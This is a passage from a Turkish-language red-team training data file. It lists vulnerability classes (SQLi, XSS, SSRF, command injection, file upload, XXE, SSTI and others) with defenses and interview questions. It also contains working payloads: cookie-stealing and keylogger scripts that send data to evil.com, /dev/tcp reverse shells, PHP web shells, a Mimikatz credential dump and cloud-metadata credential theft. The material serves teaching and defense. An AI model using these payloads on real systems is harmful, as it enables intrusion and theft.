        diffColor: "red",
        target: "Windows Sunucu / IIS / MSSQL Servisi",
        desc: "IIS veya MSSQL servisi üzerinden alınan düşük yetkili shell'de SeImpersonatePrivilege hakkını tespit edip PrintSpoofer veya GodPotato ile SYSTEM'e yükselme ve Mimikatz ile bellekteki credential dump — Windows PrivEsc'in en bilinen exploit zinciri.",
        chain: [
          { step: "1", label: "Servis Shell",          tool: "Web Exploitation",   href: "/red-team/web-exploitation", detail: "IIS RCE / webshell upload / SQLi --os-shell → iis apppool\\defaultapppool veya nt service\\mssqlserver" },
          { step: "2", label: "Token Hakları Enum",    tool: "Windows PrivEsc",    href: "/red-team/windows-privesc",  detail: "whoami /priv → SeImpersonatePrivilege: Enabled — bu tek satır SYSTEM'e yolu açar" },
          { step: "3", label: "PrintSpoofer / GodPotato", tool: "Windows PrivEsc",href: "/red-team/windows-privesc",  detail: "PrintSpoofer64.exe -i -c cmd → SYSTEM shell | GodPotato -cmd 'cmd /c whoami' → nt authority\\system" },
          { step: "4", label: "SYSTEM Shell",          tool: "Reverse Shells",     href: "/red-team/reverse-shells",   detail: "PrintSpoofer ile SYSTEM reverse shell: PrintSpoofer64.exe -c 'nc.exe KALI 4445 -e cmd.exe'" },
          { step: "5", label: "Mimikatz Credential Dump", tool: "Windows PrivEsc",href: "/red-team/windows-privesc",  detail: "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit → cleartext parola veya NTLM hash" },
          { step: "6", label: "Lateral Movement",     tool: "NetExec",             href: "/red-team/netexec",          detail: "Dump edilen admin hash ile: netexec smb 192.168.1.0/24 -u Administrator -H HASH → Pwn3d! → pivot" },
        ],
        defense: "IIS / MSSQL'i 'Network Service' veya özel düşük yetkili hesapla çalıştır — SeImpersonate genellikle bu hesaplara verilir. Windows Server 2019+ ve en güncel patch. LSASS Protected Process Light (PPL) aktif et. Defender Credential Guard.",
      },
    ],
  },
];

const levelColor: Record<string, string> = {
  amber: "text-amber-400 bg-amber-500/10 border-amber-500/20",
  red:   "text-red-400 bg-red-500/10 border-red-500/20",
};

// Tüm senaryoları düz listeye dök (eski kodu bozmamak için)
const scenarios = scenarioCategories.flatMap((c) => c.scenarios);

// ─── Popüler Zafiyetler ──────────────────────────────────────────────
interface VulnType  { name: string; desc: string }
interface VulnPayload { p: string; d: string; type?: string }
interface ToolCmd   { cmd: string; desc: string }
interface VulnDef {
  id: string; title: string; severity: string; sevColor: string;
  category: string; owasp: string; brief: string;
  types?: VulnType[];
  howWorks: string;
  detectionSteps?: string[];
  payloads: VulnPayload[];
  toolCmds?: ToolCmd[];
  tool: string; toolSlug: string;
  defense: string[];
  interview: string[];
  realWorld?: string;
}

const vulnList: VulnDef[] = [
  {
    id: "sqli",
    title: "SQL Injection (SQLi)",
    severity: "Kritik", sevColor: "red",
    category: "Web", owasp: "A03:2021",
    brief: "Kullanıcı girdisi DB sorgusuna komut olarak eklenir → auth bypass, data dump, OS shell.",
    types: [
      { name: "Union-Based", desc: "UNION SELECT ile başka tablo verisini doğrudan çek. Sayfada görünür çıktı şart." },
      { name: "Boolean-Based Blind", desc: "TRUE/FALSE'a göre sayfa farklı davranıyor mu? Byte-by-byte veri çıkar." },
      { name: "Time-Based Blind", desc: "SLEEP(5) ile sunucu 5 sn bekliyorsa zafiyet var. Hiç görünür fark olmasa da çalışır." },
      { name: "Error-Based", desc: "DB hata mesajına veriyi sızdır. EXTRACTVALUE(), UPDATEXML() ile MySQL'de yaygın." },
      { name: "Stacked Queries", desc: "Noktalı virgülle ikinci bağımsız sorgu çalıştır. MSSQL ve PostgreSQL'de etkili." },
      { name: "Out-of-Band (OOB)", desc: "DNS/HTTP ile dışarı veri gönder. Tamamen kör ortamlarda, Burp Collaborator gerekli." },
    ],
    howWorks: `Savunmasız kod (PHP):
$id = $_GET['id'];
$q  = "SELECT * FROM products WHERE id = '$id'";

Normal istek → id=1
Sorgu: SELECT * FROM products WHERE id = '1'

Saldırı → id=1' OR '1'='1'-- -
Sorgu: SELECT * FROM products WHERE id = '1' OR '1'='1'-- -'
→ WHERE her zaman TRUE → tüm ürünler döner

UNION saldırısı → id=1' UNION SELECT NULL,username,password FROM users-- -
→ users tablosu mevcut tabloya eklenir → kimlik bilgileri sızar

Prepared statement ile güvenli versiyon:
$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$id]);
→ Girdi her zaman VALUE olarak işlenir, komut olarak asla`,
    detectionSteps: [
      "Tek tırnak ' ekle → DB hatası görünüyor mu? (error-based ipucu)",
      "' OR '1'='1'-- - ekle → auth atlatıldı mı / fazla kayıt döndü mü?",
      "' AND SLEEP(5)-- - gönder → sayfa 5 sn geç cevap verdiyse time-based zafiyet",
      "' UNION SELECT NULL-- - ile sütun sayısını bul, tek tek NULL ekleyerek genişlet",
      "Gizli zafiyet için Burp Collaborator ile OOB test yap",
    ],
    payloads: [
      { type: "Auth Bypass", p: "' OR '1'='1'-- -", d: "WHERE her zaman true → login atlatma" },
      { type: "Auth Bypass", p: "admin'-- -", d: "Şifre sorgusunu yorum satırına al" },
      { type: "Union", p: "' ORDER BY 5-- -", d: "Sütun sayısını bul (hata gelene kadar artır)" },
      { type: "Union", p: "' UNION SELECT NULL,username,password,NULL FROM users-- -", d: "users tablosu dump" },
      { type: "Blind Boolean", p: "' AND SUBSTRING(username,1,1)='a'-- -", d: "İlk harf 'a' mı? TRUE/FALSE ile byte okuma" },
      { type: "Blind Time", p: "' AND SLEEP(5)-- -", d: "MySQL — 5 sn bekleme = zafiyet onayı" },
      { type: "Error-Based", p: "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -", d: "MySQL versiyon hata mesajında sızar" },
      { type: "MSSQL / Stacked", p: "'; EXEC xp_cmdshell('whoami')-- -", d: "MSSQL OS shell — xp_cmdshell etkinse" },
      { type: "WAF Bypass", p: "' /*!OR*/ '1'='1'-- -", d: "MySQL inline comment WAF atlatma" },
      { type: "WAF Bypass", p: "' OR 0x31=0x31-- -", d: "Hex encoding — filtre atlatma" },
    ],
    toolCmds: [
      { cmd: "sqlmap -u 'http://IP/page?id=1' --dbs", desc: "Mevcut veritabanlarını listele" },
      { cmd: "sqlmap -u '...' -D webapp --tables", desc: "Seçilen DB'nin tablolarını listele" },
      { cmd: "sqlmap -u '...' -D webapp -T users --dump", desc: "users tablosunu tam dök" },
      { cmd: "sqlmap -u '...' --data='user=a&pass=b' --dbs", desc: "POST form verisiyle test" },
      { cmd: "sqlmap -u '...' --level=3 --risk=2 --technique=BEU", desc: "Daha agresif tarama (Blind+Error+Union)" },
      { cmd: "sqlmap -u '...' --tamper=space2comment --batch", desc: "WAF bypass + otonom mod" },
      { cmd: "sqlmap -r burp_request.txt --batch", desc: "Burp'tan kaydedilen istek dosyasıyla çalış" },
      { cmd: "sqlmap -u '...' --os-shell", desc: "DB → OS shell (MSSQL xp_cmdshell / MySQL INTO OUTFILE)" },
    ],
    tool: "SQLMap", toolSlug: "sqlmap",
    defense: [
      "Prepared statement / parameterized query kullan — SQL'in tek kesin çözümü",
      "ORM tercih et (Hibernate, SQLAlchemy, Eloquent) — raw query yazmaktan kaçın",
      "DB hesabına minimum yetki ver (SELECT yeterli yere UPDATE verme)",
      "xp_cmdshell'i kapat (MSSQL), FILE privilege'ı kısıtla (MySQL)",
      "Hata mesajlarını kullanıcıya gösterme — generic hata sayfası kullan",
      "WAF ekle (ModSecurity, Cloudflare) — tek savunma değil, derinlik için",
      "Input validation: beklenen formatta değilse reddet (allowlist mantığı)",
    ],
    interview: [
      "SQLi türleri nelerdir ve farkları ne? (Union, Boolean, Time, Error, Stacked, OOB)",
      "Prepared statement neden SQLi'yi önler — kod seviyesinde açıkla",
      "Blind SQLi'yi görünür çıktı olmadan nasıl exploit edersin?",
      "WAF bypass için hangi teknikler kullanılır?",
      "UNION-based SQLi için sütun sayısını nasıl bulursun?",
      "xp_cmdshell nedir, neden tehlikelidir?",
    ],
    realWorld: "2021 — Accellion FTA (CVE-2021-27101): SQLi via 'document_root' parametresi → 100+ kuruluşta veri ihlali. 2019 — Capital One: SSRF+IMDS zinciri ama ilk vektör yanlış yapılandırılmış input validasyonu.",
  },
  {
    id: "xss",
    title: "Cross-Site Scripting (XSS)",
    severity: "Yüksek", sevColor: "orange",
    category: "Web", owasp: "A03:2021",
    brief: "Saldırganın kurbanın tarayıcısında JS çalıştırması → cookie çalma, keylogger, phishing.",
    types: [
      { name: "Reflected XSS", desc: "Payload URL'den gelir, sunucu anında HTML'e yansıtır. Link göndermek gerekir." },
      { name: "Stored XSS", desc: "Payload DB'ye kaydedilir, her sayfayı açan kullanıcı etkilenir. En tehlikelisi." },
      { name: "DOM XSS", desc: "Sunucu dahil değil — JS location.hash, document.referrer'ı güvensiz işliyor." },
      { name: "Blind XSS", desc: "Payload admin paneli gibi görünmeyen yerde tetiklenir. XSSHunter.com kullan." },
    ],
    howWorks: `Stored XSS (en tehlikeli):
Yorum kutusuna yaz → <script>fetch('https://evil.com?c='+document.cookie)</script>
DB'ye kaydedilir. Sayfayı her açan kurbanın cookie'si evil.com'a gider.

Reflected XSS:
URL: /search?q=<script>alert(document.domain)</script>
Sunucu q değerini doğrudan HTML'e yerleştiriyorsa tetiklenir.

DOM XSS (sunucu dahil değil):
JS kodu: document.getElementById('out').innerHTML = location.hash.slice(1)
Saldırgan URL: /page#<img src=x onerror=alert(1)>
Tarayıcı hash'i innerHTML'e yerleştirir → XSS`,
    detectionSteps: [
      "Her input alanına '<>' karakterleri yaz — HTML'de encode edilmeden görünüyor mu?",
      "Basit payload dene: <script>alert(1)</script> — tetiklendi mi?",
      "Filtreleme varsa event handler dene: <img src=x onerror=alert(1)>",
      "DOM XSS için page source yerine DevTools Elements sekmesine bak",
      "Blind XSS için Burp Collaborator veya XSSHunter.com payload'ı kullan",
    ],
    payloads: [
      { type: "Temel Test", p: "<script>alert(document.domain)</script>", d: "Domain gösterir — scope doğrular" },
      { type: "Filtre Bypass", p: "<img src=x onerror=alert(1)>", d: "script tag filtreli ortamlar için" },
      { type: "Filtre Bypass", p: "<svg onload=alert(1)>", d: "SVG tag ile event handler" },
      { type: "Attribute", p: "\" autofocus onfocus=\"alert(1)", d: "Input attribute injection" },
      { type: "Cookie Çalma", p: "fetch('//evil.com?c='+btoa(document.cookie))", d: "Base64 cookie exfil" },
      { type: "Keylogger", p: "document.onkeypress=e=>fetch('//evil.com?k='+e.key)", d: "Her tuşu dışa gönder" },
      { type: "Blind XSS", p: "\"><script src=https://xsshunter.com/payload></script>", d: "Admin paneli tetikleyici" },
    ],
    tool: "Burp Suite + XSSHunter", toolSlug: "burpsuite",
    defense: [
      "Output encoding: HTML context'te &lt;&gt; encode et, JS context'te \\uXXXX kullan",
      "Content-Security-Policy (CSP) header — script-src 'self' ile inline JS engelle",
      "HttpOnly + Secure + SameSite=Strict cookie flag'leri",
      "DOMPurify kütüphanesiyle kullanıcı HTML'ini sanitize et",
      "X-XSS-Protection: 1; mode=block (eski tarayıcılar için)",
      "innerHTML yerine textContent kullan (DOM XSS önlemi)",
    ],
    interview: [
      "Reflected, Stored ve DOM XSS farkını açıkla",
      "HttpOnly flag XSS saldırısını nasıl etkiler?",
      "CSP nedir, XSS'i nasıl kısıtlar?",
      "innerHTML vs textContent güvenlik farkı nedir?",
    ],
  },
  {
    id: "csrf",
    title: "CSRF — Cross-Site Request Forgery",
    severity: "Yüksek", sevColor: "orange",
    category: "Web", owasp: "A01:2021",
    brief: "Kurbanın tarayıcısı kurban adına istek gönderir → şifre değiştirme, para transferi.",
    types: [
      { name: "GET CSRF", desc: "State değiştiren GET endpoint'i. <img src='bank.com/logout'> yeterli." },
      { name: "POST CSRF", desc: "Gizli form otomatik submit edilir. En yaygın senaryodur." },
      { name: "Login CSRF", desc: "Kurban saldırganın hesabına login edilir — sonra izleme/manipülasyon." },
    ],
    howWorks: `1. Kurban bank.com'a giriş yapmış (oturum cookie'si var)
2. Saldırgan kurbanı evil.com'a yönlendirir
3. evil.com yüklenince gizli form otomatik submit edilir:

<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to"     value="saldirgan_iban">
  <input name="amount" value="9999">
</form>
<script>document.getElementById('f').submit()</script>

4. Kurbanın tarayıcısı bank.com'a isteği cookie'siyle gönderir
5. Banka kurbanın isteği sanır → transfer gerçekleşir

→ XSS farkı: CSRF kurbanın oturumunu KULLANAMİYOR ama KULLANDIRAMAZ
   Saldırgan kurban gibi EYLEM YAPABİLİR ama sonucu GÖREMİYOR`,
    payloads: [
      { type: "GET", p: "<img src='https://TARGET/logout'>", d: "Tek satır — GET ile state değişimi" },
      { type: "POST", p: '<form action="https://TARGET/change-pw" method="POST"><input name="pw" value="hacked"><script>this.submit()</script></form>', d: "Şifre değiştirme formu" },
      { type: "Fetch", p: "fetch('https://TARGET/api/action',{method:'POST',credentials:'include',body:'x=y'})", d: "credentials:include ile cookie gönder" },
      { type: "Token Bypass", p: "csrf_token=&action=delete", d: "Boş token — bazı sunucular geçerli sayar" },
    ],
    tool: "Burp → Engagement Tools → Generate CSRF PoC", toolSlug: "burpsuite",
    defense: [
      "CSRF token (synchronizer token pattern) — her form/isteğe sunucu tarafı doğrulama",
      "SameSite=Strict cookie — çapraz site isteklerinde cookie gitmez",
      "Origin ve Referer header'larını doğrula",
      "Double submit cookie pattern — token hem cookie hem form field'da",
      "State değiştiren endpoint'lerde GET kullanma",
    ],
    interview: [
      "CSRF ve XSS temel farkı nedir?",
      "CSRF token neden etkilidir — saldırgan neden okuyamaz?",
      "SameSite=Lax ile Strict farkı nedir, hangi senaryoda Lax yetersizdir?",
      "Burp ile CSRF PoC nasıl üretilir?",
    ],
  },
  {
    id: "ssrf",
    title: "SSRF — Server-Side Request Forgery",
    severity: "Kritik", sevColor: "red",
    category: "Web / Cloud", owasp: "A10:2021",
    brief: "Sunucu saldırganın belirlediği URL'ye istek yapar → iç ağ, AWS metadata, credential çalma.",
    types: [
      { name: "Basic SSRF", desc: "Yanıt doğrudan dönüyor — internal URL'leri keşfet." },
      { name: "Blind SSRF", desc: "Yanıt görünmüyor. Burp Collaborator/interactsh ile OOB DNS hit tespit et." },
      { name: "SSRF → CSRF", desc: "Internal service'e SSRF ile POST at — örn. iç admin paneli." },
      { name: "SSRF → Cloud Meta", desc: "169.254.169.254 (AWS) veya 169.254.169.254 (Azure) → IAM credentials." },
    ],
    howWorks: `Uygulama: GET /fetch?url=https://user-input.com → sunucu bu URL'ye istek atar

Saldırgan:
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

→ Sunucu AWS metadata'ya kendi iç ağından istek atar
→ IAM role adı döner → tekrar istek at:

GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE

→ AccessKeyId + SecretAccessKey + SessionToken → AWS'ye tam erişim!

Bypass teknikleri:
127.0.0.1 → 2130706433 (decimal) | 0x7f000001 (hex) | 127.1
localhost → localtest.me (DNS → 127.0.0.1)
169.254.169.254 → http://169.254.169.254/ → @ bypass: http://evil.com@169.254.169.254/`,
    detectionSteps: [
      "url=, path=, dest=, redirect=, next=, target= parametrelerini ara",
      "Burp Collaborator URL'si koy → DNS hit aldın mı? (Blind SSRF tespiti)",
      "http://127.0.0.1/ dene → farklı yanıt var mı?",
      "http://169.254.169.254/latest/meta-data/ ile cloud metadata test et",
      "İç ağ portlarını tara: http://192.168.1.1:PORT ile",
    ],
    payloads: [
      { type: "Localhost", p: "http://127.0.0.1/admin", d: "Dışarıdan erişilemeyen admin panel" },
      { type: "AWS Meta", p: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", d: "IAM role adını öğren" },
      { type: "Azure Meta", p: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", d: "Azure IMDS — Header: Metadata:true" },
      { type: "OOB Blind", p: "http://YOUR.burpcollaborator.net", d: "DNS hit → blind SSRF onayı" },
      { type: "Filter Bypass", p: "http://0177.0.0.1/ (octal)", d: "127.0.0.1 blocklist bypass" },
      { type: "Filter Bypass", p: "http://127.1/", d: "Kısa IP notasyonu bypass" },
    ],
    tool: "Burp Collaborator (Blind SSRF)", toolSlug: "burpsuite",
    defense: [
      "URL allowlist — yalnızca onaylı domainlere istek at",
      "Private IP range'leri blokla (10.x, 172.16-31.x, 192.168.x, 169.254.x)",
      "AWS/Azure/GCP'de IMDSv2 kullan (token tabanlı — SSRF direkt erişimi kırar)",
      "DNS rebinding koruması — TTL ve IP doğrulama",
      "Outbound HTTP'yi proxy üzerinden geçir ve loglama yap",
    ],
    interview: [
      "Blind SSRF nasıl tespit edilir — Burp Collaborator ne işe yarar?",
      "AWS IMDSv2 neden SSRF saldırılarına karşı daha güvenli?",
      "SSRF'den cloud privilege escalation'a nasıl geçilir?",
      "169.254.169.254 neden önemli?",
    ],
  },
  {
    id: "cmd-injection",
    title: "Command Injection",
    severity: "Kritik", sevColor: "red",
    category: "Web / Sistem", owasp: "A03:2021",
    brief: "Kullanıcı girdisi OS komutuna eklenir → doğrudan RCE, shell alma, ağa pivot.",
    types: [
      { name: "In-Band", desc: "Komut çıktısı HTTP yanıtında görünür — test ve okuma kolay." },
      { name: "Blind / Time-Based", desc: "Çıktı görünmüyor. sleep 5 ile gecikme ölç ya da OOB ile dışa sızdır." },
      { name: "Out-of-Band", desc: "DNS/HTTP ile Burp Collaborator'a veri gönder. Tamamen kör ortamlarda." },
    ],
    howWorks: `PHP kodu:
$target = $_GET['ip'];
system("ping -c 1 " . $target);

Normal istek: ?ip=192.168.1.1
Çalışan: ping -c 1 192.168.1.1

Saldırı: ?ip=192.168.1.1; whoami
Çalışan: ping -c 1 192.168.1.1; whoami
→ ; ikinci komutu çalıştırır → "www-data" döner

Güvenli versiyon:
escapeshellarg() ile wrap: ping -c 1 '192.168.1.1; whoami'
→ Komut hata verir — komut injection olmaz
DAHA İYİSİ: OS komutu çağırmak yerine PHP'nin net ping kütüphanesini kullan`,
    payloads: [
      { type: "Zincir", p: "; whoami", d: "Linux — noktalı virgül ile ikinci komut" },
      { type: "Zincir", p: "| id", d: "Pipe — ilk komut çıktısını ikinciye ver" },
      { type: "Zincir", p: "&& cat /etc/passwd", d: "AND — ilk başarılıysa ikinci çalışır" },
      { type: "Windows", p: "& whoami", d: "Windows CMD komut zinciri" },
      { type: "Blind", p: "; sleep 5", d: "5 sn gecikme = blind injection onayı" },
      { type: "OOB", p: "; curl http://COLLABORATOR/$(whoami)", d: "Kullanıcı adını DNS ile dışa sızdır" },
      { type: "Reverse Shell", p: "; bash -i >& /dev/tcp/KALI/4444 0>&1", d: "Direkt reverse shell" },
    ],
    tool: "Burp Repeater + Collaborator", toolSlug: "burpsuite",
    defense: [
      "OS komutu çağırmaktan kaçın — dil kütüphanelerini kullan (Python subprocess değil, os.stat())",
      "Zorunluysa allowlist: sadece beklenen karakterlere izin ver",
      "escapeshellarg() / escapeshellcmd() kullan (yeterli değil ama katman ekler)",
      "Least privilege — web sunucusu düşük yetkili kullanıcıyla çalışsın",
      "Outbound ağ erişimini kısıtla (reverse shell engellenemezse pivot de engellensin)",
    ],
    interview: [
      "In-band ve blind command injection farkı nedir?",
      "Neden kullanıcı girdisini doğrudan OS komutuna eklememeli?",
      "escapeshellarg() tek başına yeterli mi?",
      "Blind injection'ı time-based ve OOB olarak nasıl exploit edersin?",
    ],
  },
  {
    id: "file-upload",
    title: "File Upload Bypass",
    severity: "Kritik", sevColor: "red",
    category: "Web", owasp: "A04:2021",
    brief: "Dosya yükleme kısıtlamalarını atlatarak web shell yükleme → RCE.",
    types: [
      { name: "Uzantı Bypass", desc: "Blacklist'i .php5, .phtml, .phar ile at. Çift uzantı: shell.php.jpg" },
      { name: "MIME Bypass", desc: "Content-Type: image/jpeg gönder ama içerik PHP shell." },
      { name: "Magic Byte Bypass", desc: "GIF89a; öneki ekle — image validator kandırılır." },
      { name: ".htaccess Upload", desc: "AddType application/x-httpd-php .jpg yükle → .jpg PHP olarak çalışır." },
    ],
    howWorks: `Uygulama: "Sadece .jpg kabul ediyoruz"
Kontrol: if(strpos($filename, '.php') !== false) die('Yasak!');

Bypass: shell.php.jpg → sunucu .php kısmını yorumluyor → RCE!
Burp ile: Content-Disposition: filename="shell.jpg"
          Content-Type: image/jpeg
          İçerik: <?php system($_GET['cmd']); ?>

Web shell kullanımı:
http://target.com/uploads/shell.jpg?cmd=id
→ uid=33(www-data)

Reverse shell için:
?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/KALI/4444+0>%261'`,
    payloads: [
      { type: "Uzantı", p: "shell.php → shell.php.jpg", d: "Çift uzantı bypass" },
      { type: "Uzantı", p: "shell.php → shell.pHp", d: "Case bypass (blacklist büyük/küçük duyarsız)" },
      { type: "Uzantı", p: "shell.php5 / .phtml / .phar / .shtml", d: "Alternatif PHP uzantıları" },
      { type: "MIME", p: "Content-Type: image/jpeg + <?php system($_GET['c']); ?>", d: "MIME spoof + PHP shell" },
      { type: "Magic Byte", p: "GIF89a;<?php system($_GET['c']); ?>", d: "GIF header + payload" },
      { type: ".htaccess", p: "AddType application/x-httpd-php .jpg", d: ".jpg dosyasını PHP olarak çalıştır" },
    ],
    tool: "Burp Repeater — Content-Type ve filename değiştir", toolSlug: "burpsuite",
    defense: [
      "Allowlist ile uzantı kontrol et (blacklist yetersiz — .php5 unutulur)",
      "Dosyayı web root dışına kaydet — tarayıcı erişemiyor",
      "Rastgele dosya adı ver (UUID) — orijinal adı asla koru",
      "İçeriği doğrula: getimagesize() veya magic byte kontrolü (her ikisi de gerekli)",
      "Execution izinlerini kaldır: chmod 644 uploads/ klasörü",
      "CDN/S3'e yükle — web sunucusunda asla çalıştırılamaz",
    ],
    interview: [
      "MIME type kontrolü yeterli mi, neden?",
      ".htaccess upload saldırısı nasıl çalışır?",
      "Dosya yükleme güvenliğini katmanlı nasıl uygularsın?",
      "Magic byte bypass nedir?",
    ],
  },
  {
    id: "xxe",
    title: "XML External Entity (XXE)",
    severity: "Yüksek", sevColor: "orange",
    category: "Web / API", owasp: "A05:2021",
    brief: "XML parser harici entity'leri işlerse dosya okuma, SSRF, bazı durumlarda RCE.",
    howWorks: `Normal XML:
<?xml version="1.0"?>
<user><name>Burak</name></user>

XXE saldırısı — harici entity tanımı:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>

→ XML parser /etc/passwd'ı okur ve <name> içine yerleştirir
→ HTTP yanıtında dosya içeriği görünür!

Blind XXE (out-of-band):
<!ENTITY xxe SYSTEM "http://COLLABORATOR.net/?data=EXFIL">
→ DNS hit → zafiyet var, şimdi dosya içeriği exfil et`,
    payloads: [
      { type: "Dosya Okuma", p: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>", d: "/etc/passwd içeriğini yanıtta göster" },
      { type: "SSRF via XXE", p: "<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>", d: "AWS metadata erişimi" },
      { type: "Blind OOB", p: "<!ENTITY xxe SYSTEM 'http://BURP_COLLABORATOR/'>", d: "DNS ile blind XXE tespiti" },
      { type: "PHP Base64", p: "<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>", d: "PHP wrapper ile binary dosyalar" },
    ],
    tool: "Burp Suite — Content-Type: application/xml", toolSlug: "burpsuite",
    defense: [
      "XML parser'da external entity'yi devre dışı bırak (FEATURE_SECURE_PROCESSING=true)",
      "DTD işlemesini kapat (DISALLOW_DOCTYPE_DECL)",
      "Mümkünse JSON kullan — XML yerine",
      "Parser kütüphanesini güncel tut (yeni CVE'ler çıkıyor)",
    ],
    interview: [
      "XXE ile hangi verilere erişilebilir?",
      "Blind XXE nasıl tespit edilir?",
      "Parser seviyesinde XXE nasıl önlenir?",
    ],
  },
  {
    id: "ssti",
    title: "SSTI — Server-Side Template Injection",
    severity: "Kritik", sevColor: "red",
    category: "Web", owasp: "A03:2021",
    brief: "Kullanıcı girdisi template engine'e kod olarak işlenir → Jinja2/Twig RCE.",
    types: [
      { name: "Jinja2 (Python)", desc: "{{7*7}} → 49. OS komut: config.__class__.__init__.__globals__['os'].popen('id').read()" },
      { name: "Twig (PHP)", desc: "{{7*7}} → 49. Kod çalıştır: {{['id']|filter('system')}}" },
      { name: "Freemarker (Java)", desc: "${7*7} → 49. RCE için daha karmaşık zincir gerekir." },
      { name: "ERB (Ruby)", desc: "<%= 7*7 %> → 49. <%= `id` %> ile OS komut." },
    ],
    howWorks: `Savunmasız Python/Flask kodu:
from flask import render_template_string
name = request.args.get('name')
return render_template_string(f"Merhaba {name}!")

Normal: ?name=Burak → Merhaba Burak!
Saldırı: ?name={{7*7}} → Merhaba 49!
→ Template engine kodu değerlendirdi!

Jinja2 RCE zinciri:
?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
→ uid=33(www-data)

Güvenli versiyon:
return render_template_string("Merhaba {{ name }}!", name=name)
→ name değişken olarak geçer, kod olarak asla işlenmez`,
    payloads: [
      { type: "Tespit", p: "{{7*7}} / ${7*7} / #{7*7} / <%= 7*7 %>", d: "49 dönerse SSTI var — engine türünü anla" },
      { type: "Jinja2 RCE", p: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", d: "Jinja2 OS komut çalıştırma" },
      { type: "Twig RCE", p: "{{['id']|filter('system')}}", d: "Twig PHP system() çağrısı" },
      { type: "ERB RCE", p: "<%= `whoami` %>", d: "Ruby ERB backtick komut" },
    ],
    tool: "Burp Repeater + SSTImap (oto-exploit)", toolSlug: "burpsuite",
    defense: [
      "Kullanıcı girdisini template string'e doğrudan ekleme",
      "render_template_string(template, var=value) — değişken olarak geç",
      "Sandbox mode'u etkinleştir (Jinja2 SandboxedEnvironment)",
      "Mümkünse static template'ler kullan, dinamik oluşturma",
    ],
    interview: [
      "{{7*7}} neden SSTI test payload'ı olarak kullanılır?",
      "Hangi template engine'ler SSTI'ya açık?",
      "Jinja2'de RCE zinciri nasıl kurulur?",
    ],
  },
  {
    id: "idor",
    title: "IDOR — Insecure Direct Object Reference",
    severity: "Yüksek", sevColor: "orange",
    category: "Web / API", owasp: "A01:2021",
    brief: "Yetki kontrolü olmadan nesne ID değiştirme → başka kullanıcıların verisine erişim.",
    howWorks: `Authentication vs Authorization farkı:
Authentication: "Sen kimsin?" → giriş yaptın mı?
Authorization:  "Bunu yapabilir misin?" → bu kaynağa erişim hakkın var mı?

IDOR: Sunucu authenticated kontrolü yapar ama authorized yapmaz!

Örnek:
GET /api/user/1234/orders → kendi siparişlerim
GET /api/user/1235/orders → başkasının siparişleri!
→ Sunucu yalnızca "giriş yapmış mı?" bakar, "1235 sen misin?" bakmaz.

Burp Intruder ile keşif:
1. Kendi ID'ni bul (örn: 1234)
2. Intruder ile 1-9999 arası tara
3. 200 dönen ID'leri bul → başkalarının verisi`,
    payloads: [
      { type: "Sequential ID", p: "GET /api/user/§1§/profile → Intruder ile 1-9999", d: "Tüm kullanıcı profillerini tara" },
      { type: "Dosya", p: "/download?file=report_1234.pdf → report_1235.pdf", d: "Başka kullanıcının dosyası" },
      { type: "Body", p: "POST /api/update {\"user_id\": 1, \"role\": \"admin\"}", d: "Body'deki ID ve role manipülasyonu" },
      { type: "UUID Bypass", p: "Predict UUID → bazen sequential v1 UUID tahmin edilebilir", d: "UUID her zaman koruma sağlamaz" },
    ],
    tool: "Burp Intruder + Autorize extension", toolSlug: "burpsuite",
    defense: [
      "Her istek için server-side yetki kontrolü — bu kaynağa erişim hakkı var mı?",
      "Kullanıcı ID'sini URL'den değil session'dan al",
      "Indirect reference map kullan — tahmin edilemez token → gerçek ID mapping",
      "Autorize extension ile her endpoint'i test et",
    ],
    interview: [
      "IDOR ile Broken Access Control farkı nedir?",
      "UUID kullanan uygulamalar IDOR'dan güvende midir?",
      "Autorize Burp extension nasıl IDOR tespiti yapıyor?",
    ],
  },
  {
    id: "cors",
    title: "CORS Misconfiguration",
    severity: "Yüksek", sevColor: "orange",
    category: "Web / API", owasp: "A05:2021",
    brief: "Yanlış CORS politikası saldırgan origin'inin kimlik doğrulamalı API'ye istek yapmasına izin verir.",
    howWorks: `Tarayıcı Same-Origin Policy (SOP) ile çapraz origin isteklerini engeller.
CORS bu kısıtlamayı kontrollü kaldırır.

Yanlış yapılandırma:
Request: Origin: https://attacker.com
Response: Access-Control-Allow-Origin: https://attacker.com  ← reflection!
          Access-Control-Allow-Credentials: true

Saldırı kodu (evil.com'da):
fetch('https://api.target.com/user/data', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://evil.com/steal?d='+JSON.stringify(data)))

→ Kurban api.target.com'a giriş yapmışsa cookie'si ile istek gider
→ Cevap evil.com'a iletilir — tüm özel veri çalınır!

Origin reflection bypass:
Sunucu: if (origin.endsWith('.example.com')) allowOrigin = origin;
Bypass: Origin: https://evil.example.com → geçer!`,
    payloads: [
      { type: "Reflection", p: "Origin: https://attacker.com → ACAO: https://attacker.com + ACAC: true", d: "Tam erişim — credential ile" },
      { type: "Null Origin", p: "Origin: null", d: "Bazı sunucular null origin'i kabul eder (sandbox iframe'den gelir)" },
      { type: "Prefix Bypass", p: "Origin: https://target.com.evil.com", d: "Zayıf startsWith() regex bypass" },
    ],
    tool: "Burp → Origin header ekle → ACAO header'ı kontrol et", toolSlug: "burpsuite",
    defense: [
      "Origin allowlist — sadece bilinen trusted origin'lere izin ver",
      "credentials:true ile wildcard (*) kesinlikle kullanma",
      "Regex tabanlı origin doğrulama yerine exact match kullan",
      "Sensitive endpoint'lerde CORS'u minimum tut",
    ],
    interview: [
      "CORS ve CSRF farkı nedir?",
      "credentials:true + wildcard neden tehlikeli ve neden tarayıcı bunu engeller?",
